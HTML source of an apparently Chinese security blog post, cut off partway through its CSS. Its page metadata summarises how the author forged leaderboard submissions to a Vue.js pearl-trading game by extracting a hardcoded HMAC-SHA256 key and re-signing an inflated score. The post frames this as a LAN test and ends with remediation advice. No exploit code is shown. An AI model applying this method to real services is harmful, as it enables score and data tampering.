@@ -1,0 +1,1167 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SAR Pearl Market 前端逆向攻击测试 | 纳多狐狐的实验室</title><meta name="keywords" content="安全研究,前端逆向,CTF,渗透测试"><meta name="author" content="LeonardoFox"><meta name="copyright" content="LeonardoFox"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#18171d"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SAR Pearl Market 前端逆向攻击测试"><meta name="application-name" content="SAR Pearl Market 前端逆向攻击测试"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#18171d"><meta property="og:type" content="article"><meta property="og:title" content="SAR Pearl Market 前端逆向攻击测试"><meta property="og:url" content="http://leonardo346.github.io/2026/03/02/gongfangzhengzhu/index.html"><meta property="og:site_name" content="纳多狐狐的实验室"><meta property="og:description" content="一篇前端安全攻防实战文章，通过逆向一款Vue.js珍珠交易小游戏，发现其将HMAC-SHA256签名密钥硬编码在前端代码中的严重漏洞。文章完整记录了从信息侦察、网络拦截、逆向破解到漏洞利用的全过程和修复方案，核心警示：永远不要信任客户端数据，关键验证必须放在服务端。"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://s41.ax1x.com/2026/03/02/peSxpdI.png"><meta property="article:author" content="LeonardoFox"><meta property="article:tag" content="Blog&amp;Technology"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://s41.ax1x.com/2026/03/02/peSxpdI.png"><meta name="description" content="一篇前端安全攻防实战文章，通过逆向一款Vue.js珍珠交易小游戏，发现其将HMAC-SHA256签名密钥硬编码在前端代码中的严重漏洞。文章完整记录了从信息侦察、网络拦截、逆向破解到漏洞利用的全过程和修复方案，核心警示：永远不要信任客户端数据，关键验证必须放在服务端。"><link rel="shortcut icon" href="https://s21.ax1x.com/2025/08/05/pVUdq10.jpg"><link rel="canonical" href="http://leonardo346.github.io/2026/03/02/gongfangzhengzhu/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: undefined,
+  LA51: undefined,
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: undefined,
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":true,"limitCount":50,"languages":{"author":"作者: LeonardoFox","link":"链接: ","source":"来源: 纳多狐狐的实验室","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '纳多狐狐的实验室',
+  title: 'SAR Pearl Market 前端逆向攻击测试',
+  postAI: '',
+  pageFillDescription: '第一阶段：信息侦察, 第二阶段：前端篡改尝试, 第三阶段：网络层拦截, 第四阶段：逆向工程, 第五阶段：漏洞利用, 攻击结果与验证, 漏洞分析与修复建议, 漏洞矩阵, 修复建议深色模式适配机制基础卡片标签提示框步骤条代码块防复制设计仅供阅读模糊效果用于敏感信息强制代码块内所有文字为白色图片容器表格引用块全背景强调色用于关键目标文字分割线行内代码去除底部背景色改用边框或文字色测试环境说明最近看到发布了一个名为贝壳珍珠市场的一个基于网页小游戏这是一个模拟珍珠交易的经营类游戏数据存储在浏览器本地但有一个排行榜功能会将数据同步到服务器这激起了我的神秘好胜心我先试试能不能把榜首修改成我自己所以我的目标是绕过前端验证篡改游戏数据让自己登上排行榜榜首安全研究前端逆向免责声明我已将珍珠交易网站与提交服务修改成本地网络的一台靶机所有操作均在局域网内进行文章中的技术内容仅供安全研究和学习交流请勿用于非法用途本次测试没有对任何人造成影响测试用靶机及网页源代码已于小时内删除本推文仅用于记录本次测试过程及我自己的收获第一阶段信息侦察首先打开游戏页面按打开开发者工具查看应用程序标签下的发现了个以开头的存储项图扫描到的数据键名包含余额珍珠银行金库等敏感信息关键数据项包括主余额现金珍珠资产核心货币银行金库存款保证金债务在中执行查看命令查看当前资金数值查看当前资金数值当前余额当前珍珠银行存款图控制台返回当前余额为珍珠数据为包含多种珍珠价格的复杂对象发现余额是而珍珠数据是一个包含白绿蓝紫金黑红彩虹珍珠价格的复杂数组第二阶段前端篡改尝试直接修改首先尝试直接修改中的数值修改余额为修改余额为刷新页面测试结果刷新后数据被重置为说明游戏启动时会从某处加载初始数据覆盖修改元素视觉欺骗通过定位到余额显示元素尝试修改页面显示查找包含余额文本的元素查找包含余额文本的元素余额图成功定位到显示余额的元素为修改显示内容页面上的数字确实变成了但这只是视觉欺骗点击旁边的上报按钮后弹窗提示输入昵称提交后页面强制刷新数据恢复为图模拟点击上报按钮弹出输入昵称的对话框准备将数据提交到服务器第三阶段网络层拦截前端修改无法持久化说明服务器有验证需要拦截网络请求分析数据传输格式拦截请求拦截请求请求地址请求数据设置断点再次点击上报按钮成功在中看到捕获的请求图拦截到提交到的请求发现包含签名字段关键发现请求体格式为请求体结构关键发现请求中包含位十六进制的字段说明有签名验证机制直接修改会被服务器拒绝第四阶段逆向工程需要找到签名算法才能生成合法的签名在暂停状态下查看右侧的调用栈面板图的调用栈面板显示从到函数的调用链点击调用栈中的函数跳转到源码位置发现了签名生成的核心逻辑图在中找到签名函数发现硬编码密钥完整的签名函数代码签名函数源码硬编码密钥格式致命漏洞签名密钥直接硬编码在前端代码中这意味着任何人都可以使用相同的算法生成合法签名第五阶段漏洞利用现在复现签名算法构造恶意请求在中重新定义函数重新定义签名函数重新定义签名函数生成新的签名并发送请求生成伪造数据并发送目标分数伪造数据发送到服务器服务器响应图服务器返回说明伪造的签名通过了验证第一次尝试返回了但查看排行榜发现没有变化继续测试更大的数值最终成功提交了个约亿攻击结果与验证打开排行榜页面查看结果图排行榜显示以亿登顶第一名成功完成数据篡改攻击成功从第名万跃升至第名亿数据已持久化至服务器漏洞分析与修复建议漏洞矩阵漏洞描述严重程度硬编码密钥签名密钥直接嵌入前端代码严重客户端安全控制签名计算在浏览器端完成严重输入验证不足未对进行最大值限制高修复建议移除前端签名将计算迁移至服务器端前端仅提交原始数据密钥管理使用环境变量存储密钥禁止硬编码在任何客户端代码中数据验证服务器端校验的合理性如最大值增长速率等防重放机制添加随机数或严格的时间窗口限制秒内频率限制对接口实施限流和用户行为检测核心原则永远不要信任客户端数据所有关键验证必须在服务器端完成前端仅作为展示层不参与任何安全决策本文完感谢阅读欢迎交流讨论',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-03-02 02:09:51',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 8.1.1"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">纳多狐狐的实验室</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
+  "CONFIG": {
+    "modules": "0124",
+    "background": "2",
+    "tmpColor": "FFFFFF",
+    "tmpSize": "16",
+    "cityColor": "FFFFFF",
+    "citySize": "16",
+    "aqiColor": "E8D87B",
+    "aqiSize": "16",
+    "weatherIconSize": "24",
+    "alertIconSize": "18",
+    "padding": "10px 10px 10px 10px",
+    "shadow": "0",
+    "language": "auto",
+    "borderRadius": "20",
+    "fixed": "true",
+    "vertical": "top",
+    "horizontal": "left",
+    "left": "20",
+    "top": "7.1",
+    "key": "df245676fb434a0691ead1c63341cd94"
+  }
+}
+</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 全部文章</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/c-notes/"><i class="anzhiyufont anzhiyu-icon-code faa-tada" style="font-size: 0.9em;"></i><span> C语言学习</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于我</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" alt="微信" src="/null"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="/null"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AMD%E6%98%BE%E5%8D%A1/" style="font-size: 1.05rem;">AMD显卡<sup>1</sup></a><a href="/tags/ArmouryCrate/" style="font-size: 1.05rem;">ArmouryCrate<sup>1</sup></a><a href="/tags/CTF/" style="font-size: 1.05rem;">CTF<sup>1</sup></a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">C语言<sup>2</sup></a><a href="/tags/Python/" style="font-size: 1.05rem;">Python<sup>2</sup></a><a href="/tags/Python%E4%B9%8B%E7%A6%85/" style="font-size: 1.05rem;">Python之禅<sup>1</sup></a><a href="/tags/Steam/" style="font-size: 1.05rem;">Steam<sup>1</sup></a><a href="/tags/Super-Animal-Royale/" style="font-size: 1.05rem;">Super Animal Royale<sup>1</sup></a><a href="/tags/Windows/" style="font-size: 1.05rem;">Windows<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>1</sup></a><a href="/tags/%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/" style="font-size: 1.05rem;">入门教程<sup>1</sup></a><a href="/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" style="font-size: 1.05rem;">内存管理<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">前端逆向<sup>1</sup></a><a href="/tags/%E5%8D%8E%E7%A1%95ROG/" style="font-size: 1.05rem;">华硕ROG<sup>1</sup></a><a href="/tags/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/" style="font-size: 1.05rem;">右键菜单<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">后端开发<sup>1</sup></a><a href="/tags/%E5%A4%A7%E9%80%83%E6%9D%80/" style="font-size: 1.05rem;">大逃杀<sup>1</sup></a><a href="/tags/%E5%A4%A9%E9%80%89/" style="font-size: 1.05rem;">天选<sup>1</sup></a><a href="/tags/%E5%A5%A5%E5%88%9B%E4%B8%AD%E5%BF%83/" style="font-size: 1.05rem;">奥创中心<sup>1</sup></a><a href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" style="font-size: 1.05rem;">安全研究<sup>1</sup></a><a href="/tags/%E5%B0%8F%E5%8A%A8%E7%89%A9%E4%B9%8B%E6%98%9F/" style="font-size: 1.05rem;">小动物之星<sup>1</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">开发<sup>1</sup></a><a href="/tags/%E6%81%90%E6%80%96%E6%B8%B8%E6%88%8F/" style="font-size: 1.05rem;">恐怖游戏<sup>1</sup></a><a href="/tags/%E6%8A%98%E8%85%BE/" style="font-size: 1.05rem;">折腾<sup>1</sup></a><a href="/tags/%E6%94%BB%E7%95%A5/" style="font-size: 1.05rem;">攻略<sup>1</sup></a><a href="/tags/%E6%95%99%E7%A8%8B/" style="font-size: 1.05rem;">教程<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 1.05rem;">日常<sup>1</sup></a><a href="/tags/%E6%9E%81%E5%AE%A2/" style="font-size: 1.05rem;">极客<sup>1</sup></a><a href="/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/" style="font-size: 1.05rem;">注册表<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>1</sup></a><a href="/tags/%E6%B8%B8%E6%88%8F/" style="font-size: 1.05rem;">游戏<sup>1</sup></a><a href="/tags/%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80/" style="font-size: 1.05rem;">版本回退<sup>1</sup></a><a href="/tags/%E7%8E%A9%E6%9C%BA%E6%95%99%E7%A8%8B/" style="font-size: 1.05rem;">玩机教程<sup>1</sup></a><a href="/tags/%E7%AB%99%E5%8A%A1/" style="font-size: 1.05rem;">站务<sup>1</sup></a><a href="/tags/%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/" style="font-size: 1.05rem;">系统优化<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8/" style="font-size: 1.05rem;">编程入门<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E5%93%B2%E5%AD%A6/" style="font-size: 1.05rem;">编程哲学<sup>1</sup></a><a href="/tags/%E8%81%94%E6%9C%BA%E6%B8%B8%E6%88%8F/" style="font-size: 1.05rem;">联机游戏<sup>1</sup></a><a href="/tags/%E8%A7%86%E8%A7%89%E4%BF%AE%E5%A4%8D/" style="font-size: 1.05rem;">视觉修复<sup>1</sup></a></div></div></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/05/"><span class="card-archive-list-date">五月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/03/"><span class="card-archive-list-date">三月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/02/"><span class="card-archive-list-date">二月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">八月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">七月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>安全研究</span></a><a class="article-meta__tags" href="/tags/%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>前端逆向</span></a><a class="article-meta__tags" href="/tags/CTF/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CTF</span></a><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SAR Pearl Market 前端逆向攻击测试</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2026-03-01T18:09:51.000Z" title="发表于 2026-03-02 02:09:51">2026-03-02</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-03-01T18:09:51.000Z" title="更新于 2026-03-02 02:09:51">2026-03-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://s41.ax1x.com/2026/03/02/peSxpdI.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://leonardo346.github.io/2026/03/02/gongfangzhengzhu/"><header><a href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" tabindex="-1" itemprop="url">安全研究</a><a href="/tags/%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91/" tabindex="-1" itemprop="url">前端逆向</a><a href="/tags/CTF/" tabindex="-1" itemprop="url">CTF</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><h1 id="CrawlerTitle" itemprop="name headline">SAR Pearl Market 前端逆向攻击测试</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">LeonardoFox</span><time itemprop="dateCreated datePublished" datetime="2026-03-01T18:09:51.000Z" title="发表于 2026-03-02 02:09:51">2026-03-02</time><time itemprop="dateCreated datePublished" datetime="2026-03-01T18:09:51.000Z" title="更新于 2026-03-02 02:09:51">2026-03-02</time></header><style>
+  :root {
+    --md-primary: #0060ff;
+    --md-primary-dark: #004ecc;
+    --md-surface: #ffffff;
+    --md-surface-variant: #f5f5f5;
+    --md-on-surface: #212121;
+    --md-on-surface-variant: #757575;
+    --md-error: #d32f2f;
+    --md-success: #388e3c;
+    --md-warning: #f57c00;
+    --md-info: #0288d1;
+    --md-elevation-1: 0 2px 1px -1px rgba(0,0,0,0.2), 0 1px 1px 0 rgba(0,0,0,0.14), 0 1px 3px 0 rgba(0,0,0,0.12);
+    --md-elevation-2: 0 3px 1px -2px rgba(0,0,0,0.2), 0 2px 2px 0 rgba(0,0,0,0.14), 0 1px 5px 0 rgba(0,0,0,0.12);
+  }
+
+  /* 深色模式适配 - Volantis 机制 */
+  html:not([color-scheme]) {
+    --md-surface: #1e1e1e;
+    --md-surface-variant: #2d2d2d;
+    --md-on-surface: #ffffff;
+    --md-on-surface-variant: #b0b0b0;
+  }
+
+  [color-scheme="dark"] {
+    --md-surface: #1e1e1e;
+    --md-surface-variant: #2d2d2d;
+    --md-on-surface: #ffffff;
+    --md-on-surface-variant: #b0b0b0;
+  }
+
+  /* 基础卡片 */
+  .md-card {
+    background: var(--md-surface);
+    color: var(--md-on-surface);
+    border-radius: 12px;
+    padding: 24px;
+    margin: 16px 0;
+    box-shadow: var(--md-elevation-1);
+    transition: all 0.3s ease;
+  }
+
+  .md-card:hover {
+    box-shadow: var(--md-elevation-2);
+  }
+
+  .md-card-title {
+    font-size: 1.5rem;
+    font-weight: 600;
+    color: var(--md-on-surface);
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .md-card-subtitle {
+    color: var(--md-on-surface-variant);
+    font-size: 0.875rem;
+    margin-bottom: 16px;
+  }
+
+  /* Chip 标签 */
+  .md-chip {
+    display: inline-flex;
+    align-items: center;
+    padding: 6px 12px;
+    background: #e8f0fe;
+    color: #0060ff;
+    border-radius: 16px;
+    font-size: 0.875rem;
+    font-weight: 500;
+    margin: 4px;
+    transition: all 0.2s;
+  }
+
+  .md-chip:hover {
+    background: #d2e3fc;
+    transform: translateY(-1px);
+  }
+
